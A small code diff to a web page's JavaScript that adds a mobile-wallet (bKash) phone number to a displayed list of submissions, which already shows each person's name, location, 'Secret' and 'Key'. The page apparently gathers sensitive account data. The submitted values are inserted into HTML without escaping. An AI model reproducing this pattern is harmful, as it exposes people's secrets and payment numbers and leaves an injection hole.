@@ -111,6 +111,7 @@ if (document.getElementById('submissions')) {
           return `<div style="text-align:left;background:#121212;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px 12px;margin-bottom:10px;">
             <div><strong>${s.fullName}</strong> — ${s.location}</div>
             <div><small>${time}</small></div>
+            <div><small>Phone:</small> ${s.bkashNumber || ''}</div>
             <div style="margin-top:6px;word-break:break-all;"><small>Secret:</small> ${s.secret || ''}</div>
             <div style="word-break:break-all;"><small>Key:</small> ${s.key || ''}</div>
           </div>`;
